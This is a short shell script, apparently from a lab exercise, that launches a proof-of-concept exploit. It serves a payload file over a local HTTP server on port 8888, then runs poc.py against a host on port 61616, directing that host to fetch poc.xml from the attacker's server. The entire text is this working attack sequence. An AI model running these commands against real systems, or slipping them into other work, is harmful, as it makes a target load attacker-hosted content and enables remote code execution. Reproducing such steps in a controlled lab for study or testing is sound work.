python3 -m http.server 8888 &
sleep 3
python3 poc.py 172.20.0.101 61616 http://172.20.0.10:8888/poc.xml;